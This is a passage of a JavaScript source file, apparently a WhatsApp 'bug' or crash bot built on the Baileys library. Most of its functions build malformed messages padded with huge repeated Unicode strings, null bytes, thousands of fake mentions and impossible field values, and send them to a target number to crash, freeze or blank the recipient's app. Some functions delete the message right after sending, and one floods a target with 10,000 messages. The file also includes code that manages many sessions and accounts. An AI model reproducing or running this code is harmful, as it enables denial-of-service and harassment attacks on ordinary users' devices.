                fileLength: "9999999999999",
                pageCount: 3567587327,
                mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                fileName: "Gw Rizz Bang‌",
                fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1735456100",
                contactVcard: true,
                caption: "",
              },
            },
          },
          body: {
            text: " " + "ꦽ".repeat(100000),
          },
          nativeFlowMessage: {
            buttons: [
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    id: null
                  })
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    id: null
                  })
                },
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
                  })
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    copy_code: "𑜦𑜠".repeat(10000)
                  })
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    icon: "PROMOTION",
                    flow_cta: "PAYMENT_PROMOTION",
                    flow_message_version: "3"
                 })
               }
            ],
          },
        },
      },
    },
  };

  await sock.relayMessage(target, StanzaSock, {
    messageId: sock.generateMessageTag(),
    participant: { jid: target }
  });
} 


async function lockGB(sock, target) {
sock.relayMessage(
target,
{
locationMessage: {
degreesLatitude: 1010101,
degreesLongitude: 1010101,
name: "funny loc ¿? " + "ꦽ".repeat(60000),
address: ".sevrin444 ( @rraldz )",
url: "https://wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior),,〽️/" + "ꦽ".repeat(60000),
clickToWhatsappCall: true,
contextInfo: {
businessMessageForwardInfo: {
businessOwnerJid: target
},
mentionedJid: [target,"13135550002@s.whatsapp.net"]
}
}
},
{ /* participant: {jid: target} */ }
)
}

async function callCrash(sock, target) {
  await sock.relayMessage(
    int,
    {
      albumMessage: {
        contextInfo: {
          mentionedJid: Array.from(
            { length: 2000 },
            () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
          ),
          remoteJid: " ¡!deadcodex!¡ ",
          parentGroupJid: "0@g.us",
          isQuestion: true,
          isSampled: true,
          parentGroupJid: "\u0000",
          entryPointConversionDelaySeconds: 6767676767,
          businessMessageForwardInfo: null,
          botMessageSharingInfo: {
            botEntryPointOrigin: {
              origins: "BOT_MESSAGE_ORIGIN_TYPE_AI_INITIATED"
            },
            forwardScore: 999
          },
          quotedMessage: {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  body: {
                    text: "@xrelly • #fvcker 🩸",
                    format: "EXTENSIONS_1",
                  },
                  nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: "\u0000".repeat(1000000),
                    version: 1,
                  },
                },
              },
            },
          },
        },
      },
    },
    {
      participant: { jid: target},
    }
  );
}

async function crashGroup(sock, target) {
  const payload = {
    extendedTextMessage: {
      text: "DENIS" + "ꦽ".repeat(45000),
      description: " ayun<3 ",
      title: "denis is back?!! ",
      paymentLinkMetadata: {
        button: { displayText: "  @DENIS fucker" },
        header: { headerType: 1 },
        provider: { paramsJson: "{{".repeat(10000) },
      },
      linkPreviewMetadata: {
        paymentLinkMetadata: {
          button: { displayText: "  @xrelly fucker" },
          header: { headerType: 1 },
          provider: { paramsJson: "{{".repeat(10000) },
        },
        urlMetadata: { fbExperimentId: 999 },
        fbExperimentId: 888,
        linkMediaDuration: 555,
        socialMediaPostType: 1221,
      },
    },
  };

  const groupPayload = {
    groupStatusMessageV2: {
      message: payload,
    },
  };

  const msg = generateWAMessageFromContent(target, groupPayload, {});

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    //userJid: target,
  });
  
  await sleep(2000);
  
  await sock.sendMessage(target, {
      delete: {
        remoteJid: target,
        fromMe: true,
        id: msg.key.id,
      }
    })
}

async function iosXv(client, target) {
  await client.relayMessage(
    target,
    {
      requestPhoneNumberMessage: {
        skipType: " # 𝖵𝖺𝗎𝗅𝗍 - 𝖲𝗎𝗉𝖾𝗋𝗂𝗈𝗋 〽️🎭 ",
        contextInfo: {
          remoteJid: "status@broadcast",
          externalAdReply: {
            title: "𑇂𑆵𑆴𑆿".repeat(15000),
            body: "𑇂𑆵𑆴𑆿".repeat(15000),
            mediaType: "DOCUMENT",
            renderLargerThumbnail: true,
            containsAutoReply: true,
            showAdAttribution: true,
            thumbnail: { url: "https://files.catbox.moe/0iq0n3.jpg" },
            sourceUrl: `https://${"𑇂𑆵𑆴𑆿".repeat(15000)}.wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior-iOS),,〽️/`,
          },
          quotedMessage: {
            conversation: "#Vault•¿🎭?•(Superior-iOS)" 
                          + "𑇂𑆵𑆴𑆿".repeat(15000)
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "13135559999@s.whatsapp.net",
            businessDescrbiption: " # 𝖵𝖺𝗎𝗅𝗍 - 𝖲𝗎𝗉𝖾𝗋𝗂𝗈𝗋 〽️🎭 ",
          },
          mentionedJid: ["0@s.whastapp.net"],
          forwardedNewsletterMessageInfo: {
            newsletterJid: "666-666@g.us",
            serverMessageId: 1,
            newsletterName: "؂ن؃؄ٽ؂ن؃",
            contentType: "UPDATE",
          },
        },
      },
    },
    {
      participant: {jid: target}
    }
  );
}

async function IMGFRZ(sock, target) {
  await sock.relayMessage(target,
    {
      videoMessage: {
        caption: "⟨〽⃟💛✩ ᜴𝐕࿆𝐬𝐏࿆ꢵ ✩💛⃟〽⟩" + "ꦽ".repeat(65000),
        url: "https://mmg.whatsapp.net/v/t62.7161-24/535130660_2056204551619999_9212868137245798859_n.enc?ccb=11-4&oh=01_Q5Aa3wEKzQWbFu2-T6XWU7V5bRXnbKmD5r1F0y2TneH5Hy7seg&oe=69C6B8C6&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "xx78ONox8l/eqf3pYnJcMwiBCse3FVLKkk9jdfP5oPI=",
        fileLength: "9999999999999999e+9999999",
        seconds: 999999999,
        mediaKey: "LIHnYC8TN+vB3X9ed+nbu04NRdJ5PCmnHLXwu26o7RE=",
        height: 999999999999,
        width: -999999999999,
        fileEncSha256: "6a5lF9qeH/js+wV8W9fsrgVlXTSCd5htFyLKOCqzoHc=",
        directPath: "/v/t62.7161-24/535130660_2056204551619999_9212868137245798859_n.enc?ccb=11-4&oh=01_Q5Aa3wEKzQWbFu2-T6XWU7V5bRXnbKmD5r1F0y2TneH5Hy7seg&oe=69C6B8C6&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1772045071",
        jpegThumbnail: Buffer.alloc(0),
        contextInfo: {
          pairedMediaType: "NOT_PAIRED_MEDIA",
          statusSourceType: "IMAGE",
          isForwarded: true,
          forwardingScore: 9999,
          remoteJid: "VsP`Team",
          externalAdReply: {
            title: "🦋⃰͡°͜͡⃟⿻ 𖥞 𝐕꙰𝐬꙰𝐏꙰--𝐑𝟒𝐋𝐃𝐙 𒀸 " + "ꦽ".repeat(60000),
            body: "ꦽ".repeat(60000),
            mediaType: "VIDEO",
            renderLargerThumbnail: true,
            containsAutoReply: true,
            showAdAttribution: true,
            thumbnail: { url: "https://files.catbox.moe/0iq0n3.jpg" },
            sourceUrl: `https://${"ꦽ".repeat(60000)}.wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior),,〽️/`,
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "13135559999@s.whatsapp.net",
            businessDescrbiption: " # 𝖵𝖺𝗎𝗅𝗍 - 𝖲𝗎𝗉𝖾𝗋𝗂𝗈𝗋 〽️🎭 ",
          },
          mentions: target,
          groupMentions: Array.from({ length: 1900 }, () => ({
            groupJid: `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`,
            groupSubject: "X"
          })),
          quotedMessage: {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  body: {
                    text: "Sent",
                    format: "DEFAULT"
                  },
                  nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: "{",
                    version: 3
                  }
                }
              }
            }
          },
          statusAttributions: [
            {
              type: "MUSIC",
              music: {
                authorName: "ꦽ".repeat(9999),
                songId: "243234016584833",
                title: "Baon Cikadap" + "ꦽ".repeat(9999),
                author: "𖥞 𝐕꙰𝐬꙰𝐏꙰--𝐑𝟒𝐋𝐃𝐙 𒀸" + "ꦽ".repeat(9999),
                artistAttribution: "https://wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior),,〽️/",
                isExplicit: false,
              }
            },
            {
              type: "GROUP_STATUS",
              music: {
                authorName: "ꦽ".repeat(9999),
                songId: "243234016584836",
                title: "Baon Cikadap" + "ꦽ".repeat(9999),
                author: "𖥞 𝐕꙰𝐬꙰𝐏꙰--𝐑𝟒𝐋𝐃𝐙 𒀸" + "ꦽ".repeat(9999),
                artistAttribution: "https://wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior),,〽️/",
                isExplicit: false,
              }
            }
          ],
        },
        streamingSidecar: "/PFxy0I/BUf8vbt/pW0sJ2j35YorqVHaII+thZ6V7yBUnox3c4QatbRETk7b2zb3nlQ=",
        thumbnailDirectPath: "/v/t62.36147-24/593729676_1666419884645510_6285328431371507107_n.enc?ccb=11-4&oh=01_Q5Aa3wE2rCOu-EHBRz-yTOwRKjTlNItBVyfvepZpPpsmtDULhw&oe=69C69DFE&_nc_sid=5e03e0",
        thumbnailSha256: "Cjw/0a5/5hzXKuDb6Rku26kazUYCZo0pyK8Xz35ecmo=",
        thumbnailEncSha256: "DNT9rfoBh/sCwpuOIr27W/9DwsUjP/BhZjpy3iPqFG0=",
        annotations: [
          {
            location: {
              degreesLongitude: 0,
              degreesLatitude: 0,
              name: "#Vault•¿🎭?•(Superior)"
            }, 
            polygonVertices: [
              { x: 999999999999999999, y: -999999999999999999 },
              { x: 999999999999999999, y: -999999999999999999 },
              { x: 999999999999999999, y: -999999999999999999 },
              { x: 999999999999999999, y: -999999999999999999 },
            ],
            shouldSkipConfirmation: true,
            embeddedContent: {
              embeddedMusic: {
                musicContentMediaId: "34028249360153165",
                songId: "243234016584833",
                title: "Baon Cikadap" + "ꦽ".repeat(9999),
                author: "𖥞 DENIS NI BANG 𒀸" + "ꦽ".repeat(9999),
                artworkDirectPath: "/v/t62.76458-24/33007276_830604333385904_5311398360527691061_n.enc?ccb=11-4&oh=01_Q5Aa3wH56VfaFfiQnInWSCwFZPy-UZPFQtqD1IGRFYWJIs_Tjg&oe=69C6BA9E&_nc_sid=5e03e0",
                artworkSha256: "ea9OLJCdRGuahQJyYKqrvHkaQg01CYjJkCEjCid2kRg=",
                artworkEncSha256: "Av+nl2omDopYfspLMfiR7w9+DiynCncYllNpze9z8PQ=",
                artistAttribution: "https://wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior),,〽️/",
                countryBlocklist: "",
                isExplicit: false,
                artworkMediaKey: "eSQ0o4UHYhwmUuEcGXesztrXm/tlTvDRBwoTF8dgVNA=",
                musicSongStartTimeInMs: "999999999",
                derivedContentStartTimeInMs: "999999999",
                overlapDurationInMs: "999999999",
              },
            },
            embeddedAction: true,
          },
        ],
      },
    },
    {
      participant: { jid: target },
    }
  );
}

async function blankGroup(client, target) {
  await client.relayMessage(
    target,
    {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "1@newsletter",
            newsletterName: "ꦽ".repeat(60000),
            jpegThumbnail: "",
            caption: "ꦽ".repeat(60000),
            inviteExpiration: Date.now() * 999e+21
          }
        }
      },
      nativeFlowMessage: {
        messageParamsJson: "{}",
        buttons: [
          {
            name: "call_permission_request",
            buttonParamsJson: ""
          }
        ]
      },
      contextInfo: {
        mentionedJid: [
          "13135550002@s.whatsapp.net",
          ...Array.from({ length: 1999 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
      },
    },
    {}
  );
  
  await client.relayMessage(target,
    {
      extendedTextMessage: {
        text: "⤻꙳͙͡༑ORCA BERSINAR😂" + "ꦽ".repeat(120000),
        contextInfo: {
          quotedMessage: {
            groupInviteMessage: {
              groupJid: "888-62888@g.us",
              inviteCode: "Xx".repeat(100000),
              inviteExpiration: 999e+999 * Date.now(),
              groupName: "ꦽ".repeat(60000),
              caption: "ꦽ".repeat(60000),
              jpegThumbnail: ""
            }
          },
          mentionedJid: [
            "13135550002@s.whatsapp.net",
            ...Array.from({ length: 1999 }, () =>
              `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
            )
          ],
        }
      }
    },
    {}
  );
}
async function packBlank(sock, target) {
console.log(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`);
  await sock.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "X",
        name: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        publisher: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        stickers: [
          {
            fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
        ],
        fileLength: "9999999999999",
        fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
        fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
        mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
        directPath:
          "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
        contextInfo: {
          quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Bot"
                }
            }
        },
        packDescription: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        mediaKeyTimestamp: "1741150286",
        trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
        thumbnailDirectPath:
          "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
        thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
        thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash:
          "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
        stickerPackSize: "999999999",
        stickerPackOrigin: "1",
      },
    }, { participant: { jid: target } });
}
async function AyunBelovedxnxxahyaa(sock, target) {
    console.log('𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴');

    const { nodes, shouldIncludeDevicelentity } = await sock.emit('getNodes');

    const message = {
        extendedTextMessage: {
            text: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(50000) + "\n\nJust OTAX" + "\0".repeat(100),
            matchedText: "https://t.me/Otapengenkawin",
            description: "⸙ᵒᵗᵃˣнοω αяє γου?¿",
            title: "ꦽ".repeat(20000),
            previewType: 6,
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCAwYBBQEBAAAAAAAAAAAAAAAAAAAAA//aAAwDAQACEQMQAA+q6BooLAAFIkkgAJIsAAJEsAAJYACWC//9oACAEBAAEFAu7Z25Z9LiY3XbLs+d2s3R8/tYm7m0y7bLlyz25dV1ZYsuXKXLly9y5cuXL3Lly5cuXL3Lly5cuXL3Lly5f/EABYRAAMAAAAAAAAAAAAAAAAAAAEQYf/aAAgBAgEBPwFQz//EABYRAAMAAAAAAAAAAAAAAAAAAAEQUf/aAAgBAwEBPwEUz//Z",
            paymentLinkMetadata: {
                button: { displayText: "Love U My Ayun" },
                header: { headerType: 1 },
                provider: { paramsJson: "{".repeat(10000) }
            },
            contextInfo: {
                isForwarded: true,
                forwardingScore: 9999,
                participant: target,
                remoteJid: "status@broadcast",
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1995 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
                ],
                quotedMessage: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: "otax@newsletter",
                        newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(10000),
                        caption: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
                        inviteExpiration: "999999999"
                    }
                },
                forwardedNewsletterMessageInfo: {
                    newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000),
                    newsletterJid: "13135550002@newsletter",
                    serverId: 1
                }
            }
        }
    };

    const fullMsgNode = await sock.generateWAMessage(target, message, {
        userJid: sock.user.id
    });

    const encNode = fullMsgNode.content[0];

    const Stanza = {
    tag: "message",
    id: sock.generateMessageID(),
    type: "text",
    to: target,
    additionalAttributes: {},
    content: [
      {
        tag: "enc",
        attrs: {
          v: "2",
          type: "none"
        },
        content: []
      },
      {
        tag: "participants",
        atts: {},
        content: nodes
      }
    ]
  }

    await sock.sendNode(Stanza);

    await sleep(1000);

    await sock.sendMessage(target, {
        delete: {
            remoteJid: target,
            fromMe: true,
            id: fullMsgNode.attrs.id,
            participant: target
        }
    });

    console.log("Delay Visib Success To " + target);
}


async function XFCUI(sock, target) {
sock.relayMessage(
target,
{
locationMessage: {
degreesLatitude: 1010101,
degreesLongitude: 1010101,
name: "⤻꙳͙͡༑𝐃𝐄𝐍𝐈𝐒 𝐋𝐄𝐖𝐀𝐓 𝐍𝐈😂" + "ꦽ⸙".repeat(60000),
address: ".sevrin444 ( @denissayang )",
url: "https://wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior),,〽️/" + "ꦽ⸙".repeat(60000),
clickToWhatsappCall: true,
contextInfo: {
businessMessageForwardInfo: {
businessOwnerJid: target
},
mentionedJid: [target,"13135550002@s.whatsapp.net"]
}
}
},
{ participant: {jid: target} }
)
}

async function exeTrash(sock, target) {
  try {
    const exeTrash = "ꦾ".repeat(500000);
    const buttons = [];    
    for (let b = 0; b < 2000; b++) {
      buttons.push({
        buttonId: 'btn_' + "\x10".repeat(100000), 
        buttonText: {
          displayText: exeTrash.substring(0, 5000) 
        },
        type: 1
      });
    }
    
    await sock.relayMessage(
      target,
      {
        buttonsMessage: {
          contentText: "# 𝖵𝖺𝗎𝗅𝗍 - 𝖲𝗎𝗉𝖾𝗋𝗂𝗈𝗋 〽️🎭" + exeTrash.substring(0, 60000),
          footerText: exeTrash.substring(0, 60000),
          buttons: buttons,
          headerType: 1,
          viewOnce: true
        }
      },
      {
        messageId: null
      }
    ).catch(() => {}); 

  } catch (e) {
    console.log(`error: ${e.message}`);
  }
}
const {
  generateMessageIDV2, encodeSignedDeviceIdentity,jidEncode
    
} = require("@whiskeysockets/baileys");

//==========================================//

const relayMSGCustom = async (sock, target, message) => {
  const authVsP = sock.authState.creds.me.id;
  const meLid = sock.authState.creds.me?.lid;

  const { user: mePN } = jidDecode(authVsP);
  const { user: meLidU } = meLid ? jidDecode(meLid) : { user: null };

  const msgId = generateMessageIDV2(authVsP);
  const ngentodd = jidEncode(jidDecode(meLid)?.user, "lid", undefined);

  const meMsg = {
    deviceSentMessage: {
      destinationJid: target,
      message
    },
    messageContextInfo: message.messageContextInfo
  };

  const VsP = {};

  const mediaTypeVsP =
    message.imageMessage ? "image" : message.videoMessage ? message.videoMessage.gifPlayback ? "gif" : "video" : message.audioMessage ? message.audioMessage.ptt ? "ptt" : "audio" : message.documentMessage ? "document" : message.stickerMessage ? "sticker" : undefined;

  if (mediaTypeVsP) VsP.mediatype = mediaTypeVsP;
  let stanza;
  await sock.authState.keys.transaction(async () => {
    const devices = await sock.getUSyncDevices([ngentodd, target], true, false);
    const meR = [];
    const otR = [];
    for (const { user, jid: dJid } of devices) {
      if (dJid === authVsP || (meLid && dJid === meLid)) continue;
      const isMe = user === mePN || user === meLidU;
      (isMe ? meR : otR).push(dJid);
    }

    const all = [...meR, ...otR];
    await sock.assertSessions(all);
    const [
      { nodes: meN, shouldIncludeDeviceIdentity: s1 },
      { nodes: otN, shouldIncludeDeviceIdentity: s2 }
    ] = await Promise.all([
      sock.createParticipantNodes(meR, {
        conversation: "⟨〽⃟💛✩ ᜴𝐕࿆𝐬𝐏࿆ꢵ ✩💛⃟〽⟩"
      }),
      sock.createParticipantNodes(otR, message, VsP, meMsg)
    ]);

    const ahahahk = [
      ...meN.map(n => {
        n.content[0].content = Buffer.from("hello world", "base64");
        return n;
      }),
      ...otN
    ];

    const incDI = s1 || s2;
    stanza = {
      tag: "message",
      attrs: {
        id: msgId,
        to: target,
        type: ["imageMessage", "videoMessage", "audioMessage", "documentMessage", "stickerMessage"].some(k => k in message) ? "media" : "reactionMessage" in message ? "reaction" : "text"
      },
      content: ahahahk.length ? [{ tag: "participants", attrs: {}, content: ahahahk }] : []
    };

    if (incDI) {
      stanza.content.push({
        tag: "device-identity",
        attrs: {},
        content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
      });
    }

    await sock.sendNode(stanza);
  }, authVsP);

  return stanza;
};

//==========================================//

async function VxLOneMsg(sock, target) {
  await sock.sendMessage(target, { 
    text: "VxL - Execute #Fahri"
  });  

  for (let r = 0; r < 10000; r++) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
            fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
            fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
            mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
            mimetype: "image/webp",
            directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
            fileLength: "10610",
            mediaKeyTimestamp: "1775044724",
            stickerSentTs: "1775044724091"
          }
        }
      }
    }, { participant: { jid: target }, messageId: null });
    await new Promise((r) => setTimeout(r, 1500));
  }
}
// ======================================= //
// WhatsApp Connect Logic
const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
const activeConnections = {};
const biz = {};   // Untuk WA Business
const mess = {};  // Untuk WA Messenger

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files; // ✅ Tambahkan return
  } catch (err) {
    console.error("Buat Folder 'permenmd' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

// === Setup VIP Folder ===
function getVipSessionPath(sessionName) {
  return path.join('vip', sessionName);
}
function setupVipFolder() {
  // Ganti path menjadi root folder 'vip', bukan di dalam 'permenmd'
  const vipPath = path.join(__dirname, 'vip');

  try {
    if (!fs.existsSync(vipPath)) {
      fs.mkdirSync(vipPath, { recursive: true });
      console.log("[INFO] Folder VIP (root) dibuat otomatis.");
    }
  } catch (err) {
    console.error("[INFO] Gagal membuat folder VIP:", err);
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}/*

async function connectSession(folderPath, sessionName, retries = 5) {
  if (activeConnections[sessionName]) return activeConnections[sessionName];

  const sessionsFold = path.join(folderPath, sessionName);

  return new Promise(async (resolve) => {
    try {
      const { state, saveCreds } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("creds.update", saveCreds);

      sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (qr) qrCodes[sessionName] = qr;

        if (connection === "open") {
          delete qrCodes[sessionName];
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(path.join(sessionsFold, 'creds.json'));
          console.log(`[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") biz[sessionName] = sock;
          else if (type === "Messenger") mess[sessionName] = sock;

          resolve(sock);
        } else if (connection === "close") {
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

          if (isLoggedOut) {
